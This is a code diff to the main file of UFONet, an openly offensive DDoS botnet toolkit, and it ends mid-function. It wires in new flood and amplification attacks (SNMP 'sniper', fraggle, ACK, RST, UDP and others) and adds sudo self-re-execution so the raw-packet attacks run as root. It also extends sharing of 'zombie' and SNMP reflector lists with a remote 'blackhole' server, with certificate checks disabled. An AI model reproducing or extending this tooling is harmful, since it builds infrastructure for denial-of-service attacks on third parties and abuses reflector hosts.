@@ -39,6 +39,14 @@ from core.mods.xmas import XMAS
 from core.mods.nuke import NUKE
 from core.mods.tachyon import TACHYON
 from core.mods.monlist import MONLIST
+from core.mods.sniper import SNIPER
+from core.mods.ufoack import UFOACK
+from core.mods.uforst import UFORST
+from core.mods.droper import DROPER
+from core.mods.overlap import OVERLAP
+from core.mods.pinger import PINGER
+from core.mods.ufoudp import UFOUDP
+from core.mods.fraggle import FRAGGLE
 
 DEBUG = False # use 'True' for detailed traceback
 
@@ -64,6 +72,7 @@ class UFONet(object):
         self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
         self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
         self.ntps_file = 'botnet/ntp.txt' # set source path to retrieve [NTPs]
+        self.snmps_file = 'botnet/snmp.txt' # set source path to retrieve [SNMPs]
         self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
         self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve [Dorks]
         self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
@@ -109,10 +118,18 @@ class UFONet(object):
         self.total_syn = 0
         self.total_spray = 0
         self.total_smurf = 0
+        self.total_fraggle = 0
         self.total_xmas = 0
+        self.total_ufoack = 0
+        self.total_uforst = 0
+        self.total_droper = 0
+        self.total_overlap = 0
+        self.total_pinger = 0
+        self.total_ufoudp = 0
         self.total_nuke = 0
         self.total_tachyon = 0
         self.total_monlist = 0
+        self.total_sniper = 0
         self.total_zombies_failed_connection = 0
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
@@ -177,28 +194,28 @@ class UFONet(object):
 
     def banner_welcome(self):
         print("")
-        print("                                                0=============================================0")
-        print("                   + (XX) +                     ||                                           ||")
-        print("   ||             *~~~~~~~~*              ||    ||  * Botnet -> [DDoS]:                      ||")
-        print(" -(00)-          (0)      (0)           -(00)-  ||      /ZOMBIES : HTTP GET bots             ||")
-        print("   ||             \| (00) |/              ||    ||      /DROIDS  : HTTP GET (+params) bots   ||")
-        print("        (O)_  (O)  0'----'0  (O)  _(O)          ||      /ALIENS  : HTTP POST bots            ||")   
-        print("            |  |.''.( xx ).''.|  |              ||      /UCAVs   : Web Abusing bots          ||")
-        print("            .'.'   X|'..'|X   '.'.              ||      /X-RPCs  : XML-RPC bots              ||")
-        print("     .-.  .' /'--.__|_00_|__.--'\ '.  .-.       ||      /DBSTRESS: HTTP Database flooder     ||")
-        print("    (O).)-|0|  \   x| ## |x   /  |0|-(.(O)      ||      /SPRAY   : TCP-SYN reflector         ||")
-        print("     `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'       ||      /SMURF   : ICMP echo flooder         ||")
-        print("        _ | ||  '-.___||___.-'  || | _          ||      /TACHYON : DNS amplificator          ||")
-        print("     .' _ | ||==O |   __   | O==|| | _ '.       ||      /MONLIST : NTP amplificator          ||")
-        print("    / .' ''.|  || | /_00_\ | ||  |.'' '. \      ||                                           ||")
-        print("    | '###  |  =| | ###### | |=  |' ###  |      ||   * Close Combat -> [DoS]:                ||")
-        print("    | |(0)| '.  0\||__**_ ||/0  .' |(0)| |      ||      /LOIC    : Fast HTTP requests        ||")
-        print("    \ '._.'   '.  | \_##_/ |  .'   '._.' /      ||      /LORIS   : Slow HTTP requests        ||")
-        print("     '.__ ____0_'.|__'--'__|.'_0____ __.'       ||      /UFOSYN  : TCP-SYN flooder           ||")
-        print("    .'_.-|            YY            |-._'.      ||      /XMAS    : TCP-XMAS flooder          ||")
-        print("                                                ||      /NUKE    : TCP-STARVATION attack     ||") 
-        print("    + Class: UFONet / ViPR404+ (model H) +      ||                                           ||")
-        print("                                                0|===========================================|0") 
+        print("          ||          /\        ||              #===============================================#")
+        print("        -(00)-     + (XX) +   -(00)-            ||                                             ||")
+        print("   ||     ||      *~~~~~~~~*    ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
+        print(" -(00)-          (0)  XX  (0)           -(00)-  ||                                             ||")
+        print("   ||             \| (00) |/              ||    ||     |-> ZOMBIES    #     |-> LOIC           ||")
+        print("        (O)_  (O)  0'----'0  (O)  _(O)          ||     |-> DROIDS     #     |-> LORIS          ||")   
+        print("            |  |.''.( xx ).''.|  |              ||     |-> ALIENS     #     |-> UFOSYN         ||")
+        print("            .'.'   X|'..'|X   '.'.              ||     |-> UCAVs      #     |-> XMAS           ||")
+        print("     .-.  .' /'--.__|_00_|__.--'\ '.  .-.       ||     |-> X-RPCs     #     |-> NUKE           ||")
+        print("    (O).)-|0|  \   x| ## |x   /  |0|-(.(O)      ||     |-> DBSTRESS   #     |-> UFOACK         ||")
+        print("     `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'       ||     |-> SPRAY      #     |-> UFORST         ||")
+        print("        _ | ||  '-.___||___.-'  || | _          ||     |-> SMURF      #     |-> DROPER         ||")
+        print("     .' _ | ||==O |   __   | O==|| | _ '.       ||     |-> TACHYON    #     |-> OVERLAP        ||")
+        print("    / .' ''.|  || | /_00_\ | ||  |.'' '. \      ||     |-> MONLIST    #     |-> PINGER         ||")
+        print("    | '###  |  =| | ###### | |=  |' ###  |      ||     |-> FRAGGLE    #     |-> UFOUDP         ||")
+        print("    | |(0)| '.  0\||__**_ ||/0  .' |(0)| |      ||     |-> SNIPER     #                        ||")
+        print("    \ '._.'   '.  | \_##_/ |  .'   '._.' /      ||                                             ||")
+        print("     '.__ ____0_'.|__'--'__|.'_0____ __.'       #|=============================================|#")
+        print("    .'_.-|            YY            |-._'.      ||                                             ||")
+        print("                                                ||  -> [ UFONet: https://ufonet.03c8.net ] <-  ||") 
+        print("    + Class: PSYoPs / ViPR404+ (model I^) +     ||                                             ||")
+        print("                                                #|=============================================|#") 
         print("")
 
     def banner(self):
@@ -519,6 +536,17 @@ class UFONet(object):
                 except:
                     pass # keep running, but SMURF will fail
 
+        # check EUID when running FRAGGLE (root required)
+        if options.fraggle:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [FRAGGLE] (--fraggle) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but FRAGGLE will fail
+
         # check EUID when running XMAS (root required)
         if options.xmas:
             euid = self.checkeuid()
@@ -529,6 +557,72 @@ class UFONet(object):
                     os.execlpe('sudo', *args)
                 except:
                     pass # keep running, but XMAS will fail
+
+        # check EUID when running UFOACK (root required)
+        if options.ufoack:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [UFOACK] (--ufoack) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but UFOACK will fail
+
+        # check EUID when running UFORST (root required)
+        if options.uforst:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [UFORST] (--uforst) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but UFORST will fail
+
+        # check EUID when running DROPER (root required)
+        if options.droper:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [DROPER] (--droper) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but DROPER will fail
+
+        # check EUID when running OVERLAP (root required)
+        if options.overlap:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [OVERLAP] (--overlap) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but OVERLAP will fail
+
+        # check EUID when running PINGER (root required)
+        if options.pinger:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [PINGER] (--pinger) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but PINGER will fail
+
+        # check EUID when running UFOUDP (root required)
+        if options.ufoudp:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [UFOUDP] (--ufoudp) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but UFOUDP will fail
 
         # check EUID when running NUKE (root required)
         if options.nuke:
@@ -562,6 +656,17 @@ class UFONet(object):
                     os.execlpe('sudo', *args)
                 except:
                     pass # keep running, but MONLIST will fail
+
+        # check EUID when running SNIPER (root required)
+        if options.sniper:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [SNIPER] (--sniper) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but SNIPER will fail
 
         # search for [Zombies] on search engines results (dorking)
         if options.search:
@@ -1400,7 +1505,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "nuke": "0", "tachyon": "0", "monlist": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "fraggle": "0", "xmas": "0", "ufoack": "0", "uforst": "0", "droper": "0", "overlap": "0", "pinger": "0", "ufoudp": "0", "nuke": "0", "tachyon": "0", "monlist": "0", "sniper": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -1540,6 +1645,18 @@ class UFONet(object):
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
 
+    def update_fraggle_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        afraggle = data["fraggle"]
+        afraggle = str(int(afraggle) + 1) # add new fraggle attack to recorded stats
+        self.total_fraggle = self.total_fraggle + 1 # add new fraggle attack to session stats
+        data["fraggle"] = afraggle
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
     def update_xmas_stats(self):
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
@@ -1548,6 +1665,78 @@ class UFONet(object):
         axmas = str(int(axmas) + 1) # add new xmas attack to recorded stats
         self.total_xmas = self.total_xmas + 1 # add new xmas attack to session stats
         data["xmas"] = axmas
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_ufoack_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aufoack = data["ufoack"]
+        aufoack = str(int(aufoack) + 1) # add new ufoack attack to recorded stats
+        self.total_ufoack = self.total_ufoack + 1 # add new ufoack attack to session stats
+        data["ufoack"] = aufoack
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_uforst_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        auforst = data["uforst"]
+        auforst = str(int(auforst) + 1) # add new uforst attack to recorded stats
+        self.total_uforst = self.total_uforst + 1 # add new uforst attack to session stats
+        data["uforst"] = auforst
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_droper_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        adroper = data["droper"]
+        adroper = str(int(adroper) + 1) # add new droper attack to recorded stats
+        self.total_droper = self.total_droper + 1 # add new droper attack to session stats
+        data["droper"] = adroper
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_overlap_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aoverlap = data["overlap"]
+        aoverlap = str(int(aoverlap) + 1) # add new overlap attack to recorded stats
+        self.total_overlap = self.total_overlap + 1 # add new overlap attack to session stats
+        data["overlap"] = aoverlap
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_pinger_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        apinger = data["pinger"]
+        apinger = str(int(apinger) + 1) # add new pinger attack to recorded stats
+        self.total_pinger = self.total_pinger + 1 # add new pinger attack to session stats
+        data["pinger"] = apinger
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_ufoudp_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aufoudp = data["ufoudp"]
+        aufoudp = str(int(aufoudp) + 1) # add new ufoudp attack to recorded stats
+        self.total_ufoudp = self.total_ufoudp + 1 # add new ufoudp attack to session stats
+        data["ufoudp"] = aufoudp
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
@@ -1588,6 +1777,18 @@ class UFONet(object):
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
 
+    def update_sniper_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        asniper = data["sniper"]
+        asniper = str(int(asniper) + 1) # add new sniper attack to recorded stats
+        self.total_sniper = self.total_sniper + 1 # add new sniper attack to session stats
+        data["sniper"] = asniper
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
     def uploading_list(self):
         from io import BytesIO
         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
@@ -1599,6 +1800,7 @@ class UFONet(object):
         reflectors = "botnet/reflectors.txt.gz"
         crystals = "botnet/crystals.txt.gz"
         warps = "botnet/warps.txt.gz"
+        bosons = "botnet/bosons.txt.gz"
         if self.options.timeout: # set timeout
             try:
                 timeout = int(self.options.timeout)
@@ -1627,6 +1829,8 @@ class UFONet(object):
                 crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                 req = urllib.request.Request('https://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                 warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
+                bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
             else:
                 if self.options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
@@ -1644,7 +1848,9 @@ class UFONet(object):
                 crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                 req = urllib.request.Request('http://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                 warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
-            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "":
+                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
+                bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
+            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "" and bosons_reply == "":
                 print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                 print('-'*12 + '\n')
                 print("[Error] [AI] Unable to uploading list of [Zombies] to this [Blackhole] [Server] -> [Exiting!]\n")
@@ -1720,6 +1926,16 @@ class UFONet(object):
                 for _ in f:
                     num_warps = num_warps + 1
             print("[Info] [DNSs] on [Blackhole]   : "+ str(num_warps))
+            f_in_bosons = gzip.open(BytesIO(bosons_reply), 'rb')
+            f_out_bosons = open('botnet/bosons.txt', 'wb')
+            f_out_bosons.write(f_in_bosons.read())
+            f_in_bosons.close()
+            f_out_bosons.close()
+            num_bosons = 0
+            with open('botnet/bosons.txt') as f:
+                for _ in f:
+                    num_bosons = num_bosons + 1
+            print("[Info] [SNMPs] on [Blackhole]   : "+ str(num_bosons))
             print('-'*12 + '\n')
             if not self.options.forceyes:
                 update_reply = input("[AI] Do you want to merge ONLY the new [Zombies] into [Blackhole]? (Y/n)")
@@ -1734,6 +1950,7 @@ class UFONet(object):
                 os.remove('botnet/reflectors.txt') # remove reflectors file
                 os.remove('botnet/crystals.txt') # remove crystals file
                 os.remove('botnet/warps.txt') # remove warps file
+                os.remove('botnet/bosons.txt') # remove bosons file
                 print("\n[Info] [AI] [Control] Aborting uploading process and cleaning temporal files... -> [Exiting!]\n")
                 return
             else:
@@ -1880,8 +2097,28 @@ class UFONet(object):
                     else:
                         pass
                 print("[Info] [AI] New [DNSs] found   : " + str(dnss_added))
+                snmps = self.extract_snmps()
+                if not snmps:
+                    return
+                snmps_community = []
+                snmps_added = 0
+                f = open('botnet/bosons.txt')
+                bosons = f.readlines()
+                bosons = [boson.strip() for boson in bosons]
+                f.close()
+                fz = open(self.snmps_file)
+                snmps = fz.readlines()
+                snmps = [snmp.strip() for snmp in snmps]
+                fz.close()
+                for snmp in snmps:
+                    if snmp not in crystals:
+                        snmps_community.append(snmp)
+                        snmps_added = snmps_added + 1
+                    else:
+                        pass
+                print("[Info] [AI] New [SNMPs] found   : " + str(snmps_added))
                 print('-'*12 + '\n')
-                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0 and ntps_added == 0 and dnss_added == 0: # not any zombie
+                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0 and ntps_added == 0 and dnss_added == 0 and snmps_added == 0: # not any zombie
                     os.remove('botnet/abductions.txt') # remove abductions file
                     os.remove('botnet/troops.txt') # remove troops file
                     os.remove('botnet/robots.txt') # remove robots file
@@ -1889,6 +2126,7 @@ class UFONet(object):
                     os.remove('botnet/reflectors.txt') # remove rpcs file
                     os.remove('botnet/crystals.txt') # remove crystals file
                     os.remove('botnet/warps.txt') # remove warps file
+                    os.remove('botnet/bosons.txt') # remove snmps file
                     print("[Info] [AI] Try to search for new [Zombies]. These are already in this [Blackhole] -> [Exiting!]\n")
                     return
                 else:
@@ -1927,6 +2165,11 @@ class UFONet(object):
                         fc.write(dns.strip()+"\n")
                     fc.close()
                     os.remove('botnet/warps.txt') # remove warps file
+                    fc = gzip.open('botnet/community_snmps.txt.gz', 'wb')
+                    for snmp in snmps_community:
+                        fc.write(snmp.strip()+"\n")
+                    fc.close()
+                    os.remove('botnet/bosons.txt') # remove bosons file
                     print("[Info] [AI] Starting to upload new [Zombies]...\n")
                     try: # open a socket and send data to the blackhole reciever port
                         host = self.blackhole 
@@ -2023,6 +2266,19 @@ class UFONet(object):
                             ms.send(data)
                             ms.close()
                             os.remove('botnet/community_dnss.txt.gz') # remove local dnss .gz file after transfer
+                            time.sleep(1)
+                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
+                            cs.connect(host, cport)
+                            cs.send("SEND " + 'community_snmps.txt.gz')
+                            cs.close()
+                            f = open('botnet/community_snmps.txt.gz', "rb")
+                            data = f.read()
+                            f.close()
+                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            ms.connect(host, mport)
+                            ms.send(data)
+                            ms.close()
+                            os.remove('botnet/community_snmps.txt.gz') # remove local snmps .gz file after transfer
                             time.sleep(2) # sleep a bit more
                             print('-'*12 + '\n')
                             print("[Info] [AI] Transfer -> [DONE!]\n")
@@ -2184,6 +2440,11 @@ class UFONet(object):
                     warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                 except:
                     warps_reply = ""
+                try:
+                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
+                    bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
+                except:
+                    bosons_reply = ""
             else:
                 try:
                     req = urllib.request.Request('http://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
@@ -2220,7 +2481,12 @@ class UFONet(object):
                     warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                 except:
                     warps_reply = ""
-            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "":
+                try:
+                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
+                    bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
+                except:
+                    bosons_reply = ""
+            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "" and bosons_reply == "":
                 print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                 print('-'*12 + '\n')
                 print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
@@ -2248,6 +2514,9 @@ class UFONet(object):
             f.close()
             f = open('botnet/warps.txt.gz', 'wb')
             f.write(warps_reply)
+            f.close()
+            f = open('botnet/bosons.txt.gz', 'wb')
+            f.write(bosons_reply)
             f.close()
             print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX READY!] ;-)")
         except:
@@ -2301,6 +2570,12 @@ class UFONet(object):
         f_in_warps.close()
         f_out_warps.close()
         os.remove('botnet/warps.txt.gz') # remove warps .gz file
+        f_in_bosons = gzip.open('botnet/bosons.txt.gz', 'rb')
+        f_out_bosons = open('botnet/bosons.txt', 'wb')
+        f_out_bosons.write(f_in_bosons.read())
+        f_in_bosons.close()
+        f_out_bosons.close()
+        os.remove('botnet/bosons.txt.gz') # remove bosons .gz file
         num_abductions = 0
         with open('botnet/abductions.txt') as f:
             for _ in f:
@@ -2336,7 +2611,12 @@ class UFONet(object):
             for _ in f:
                 num_warps = num_warps + 1
         print("[Info] NTPs   : " + str(num_warps))
-        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps
+        num_bosons = 0
+        with open('botnet/bosons.txt') as f:
+            for _ in f:
+                num_bosons = num_bosons + 1
+        print("[Info] SNMPs  : " + str(num_bosons))
+        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps + num_bosons
         print("\n[Info] [AI] Congratulations!. Total downloaded: " + str(total_zombies))
         print('-'*12)
         if not self.options.forceyes:
@@ -2352,6 +2632,7 @@ class UFONet(object):
             os.remove('botnet/reflectors.txt') # remove reflectors file
             os.remove('botnet/crystals.txt') # remove crystals file
             os.remove('botnet/warps.txt') # remove warps file
+            os.remove('botnet/bosons.txt') # remove bosons file
             print("\n[Info] [AI] [Control] Temporal list downloaded has been removed! -> [Exiting!]")
             print('-'*25)
             print("\n[AI] "+self.exit_msg+"\n")
@@ -2461,6 +2742,21 @@ class UFONet(object):
                     pass
             self.update_ntps(ntps_ready)
             os.remove('botnet/warps.txt') # remove warps .txt file
+            snmps_ready = []
+            f = open('botnet/bosons.txt')
+            bosons = f.readlines()
+            f.close()
+            fz = open(self.snmps_file)
+            snmps = fz.readlines()
+            fz.close()
+            for boson in bosons:
+                boson = boson.replace('\n','')
+                if boson not in snmps:
+                    snmps_ready.append(boson)
+                else:
+                    pass
+            self.update_snmps(snmps_ready)
+            os.remove('botnet/bosons.txt') # remove bosons .txt file
             print("\n[Info] [AI] Botnet updated! -> ;-)")
             self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
             if not self.options.forceyes: # ask for update everything
@@ -2533,7 +2829,12 @@ class UFONet(object):
                 ntp_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
             except:
                 ntp_reply = ""
-            if zombies_reply == "" and aliens_reply == "" and dns_reply == "" and droids_reply == "" and rpcs_reply == "" and ucavs_reply == "" and ntp_reply == "":
+            try:
+                req = urllib.request.Request(self.github_zombies+'snmp.txt', None, headers)
+                snmp_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
+            except:
+                snmp_reply = ""
+            if zombies_reply == "" and aliens_reply == "" and dns_reply == "" and droids_reply == "" and rpcs_reply == "" and ucavs_reply == "" and ntp_reply == "" and snmp_reply == "":
                 print("[AI] [Control] [Blackhole] [GitHub] Reply: [VORTEX FAILED!]")
                 print('-'*12 + '\n')
                 print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [GitHub] -> [Exiting!]\n")
@@ -2558,6 +2859,9 @@ class UFONet(object):
             f.close()
             f = open('botnet/warps.txt', 'w') # ntp
             f.write(ntp_reply)
+            f.close()
+            f = open('botnet/bosons.txt', 'w') # snmp
+            f.write(snmp_reply)
             f.close()
             print("[AI] [Control] [Blackhole] [GitHub] Reply: [VORTEX READY!] ;-)")
         except:
@@ -2601,7 +2905,12 @@ class UFONet(object):
             for _ in f:
                 num_warps = num_warps + 1
         print("[Info] NTPs   : " + str(num_warps))
-        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps
+        num_bosons = 0
+        with open('botnet/bosons.txt') as f: # snmp
+            for _ in f:
+                num_bosons = num_bosons + 1
+        print("[Info] SNMPs  : " + str(num_bosons))
+        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps + num_bosons
         print("\n[Info] [AI] Congratulations!. Total downloaded: " + str(total_zombies))
         print('-'*12)
         if not self.options.forceyes:
@@ -2617,6 +2926,7 @@ class UFONet(object):
             os.remove('botnet/drones.txt') # remove ucavs/drones file
             os.remove('botnet/reflectors.txt') # remove rpcs/reflectors file
             os.remove('botnet/warps.txt') # remove ntp/warps file
+            os.remove('botnet/bosons.txt') # remove snmp/bosons file
             print("\n[Info] [AI] [Control] Temporal list downloaded has been removed! -> [Exiting!]")
             print('-'*25)
             print("\n[AI] "+self.exit_msg+"\n")
@@ -2726,6 +3036,21 @@ class UFONet(object):
                     pass
             self.update_ntps(ntps_ready)
             os.remove('botnet/warps.txt') # remove NTP/warps file
+            snmps_ready = []
+            f = open('botnet/bosons.txt')
+            bosons = f.readlines()
+            f.close()
+            fz = open(self.snmps_file)
+            snmps = fz.readlines()
+            fz.close()
+            for boson in bosons:
+                boson = boson.replace('\n','')
+                if boson not in snmps:
+                    snmps_ready.append(boson)
+                else:
+                    pass
+            self.update_snmps(snmps_ready)
+            os.remove('botnet/bosons.txt') # remove SNMP/bosons file
             print("\n[Info] [AI] Botnet updated! -> ;-)")
             self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
             if not self.options.forceyes: # ask for update everything
@@ -3697,16 +4022,16 @@ class UFONet(object):
             ntps = [ ntp.replace('\n','') for ntp in ntps ]
             f.close()
             if not ntps:
-                print("[Info] [AI] [Control] Cannot retrieve [NTPs] from: 'botnet/ntps.txt' -> [Discarding!]")
+                print("[Info] [AI] [Control] Cannot retrieve [NTPs] from: 'botnet/ntp.txt' -> [Discarding!]")
                 return
             else:
                 return ntps
         except:
             if os.path.exists(self.ntps_file) == True:
-                print("[Info] [AI] [Control] Cannot open [NTPs] from: 'botnet/ntps.txt' -> [Discarding!]")
+                print("[Info] [AI] [Control] Cannot open [NTPs] from: 'botnet/ntp.txt' -> [Discarding!]")
                 return
             else:
-                print("[Info] [AI] [Control] Cannot found [NTPs] from: 'botnet/ntps.txt' [Discarding!]")
+                print("[Info] [AI] [Control] Cannot found [NTPs] from: 'botnet/ntp.txt' [Discarding!]")
                 return
 
     def extract_dnss(self):
@@ -3719,16 +4044,38 @@ class UFONet(object):
             dnss = [ dns.replace('\n','') for dns in dnss ]
             f.close()
             if not dnss:
-                print("[Info] [AI] [Control] Cannot retrieve [DNSs] from: 'botnet/dnss.txt' -> [Discarding!]")
+                print("[Info] [AI] [Control] Cannot retrieve [DNSs] from: 'botnet/dns.txt' -> [Discarding!]")
                 return
             else:
                 return dnss
         except:
             if os.path.exists(self.dnss_file) == True:
-                print("[Info] [AI] [Control] Cannot open [DNSs] from: 'botnet/dnss.txt' -> [Discarding!]")
+                print("[Info] [AI] [Control] Cannot open [DNSs] from: 'botnet/dns.txt' -> [Discarding!]")
                 return
             else:
-                print("[Info] [AI] [Control] Cannot found [DNSs] from: 'botnet/dnss.txt' [Discarding!]")
+                print("[Info] [AI] [Control] Cannot found [DNSs] from: 'botnet/dns.txt' [Discarding!]")
+                return
+
+    def extract_snmps(self):
+        # extract snmps from file
+        options = self.options
+        try:
+            f = open(self.snmps_file)
+            snmps = f.readlines()
+            snmps = [ snmp.replace('\r','') for snmp in snmps ]
+            snmps = [ snmp.replace('\n','') for snmp in snmps ]
+            f.close()
+            if not snmps:
+                print("[Info] [AI] [Control] Cannot retrieve [SNMPs] from: 'botnet/snmp.txt' -> [Discarding!]")
+                return
+            else:
+                return snmps
+        except:
+            if os.path.exists(self.snmps_file) == True:
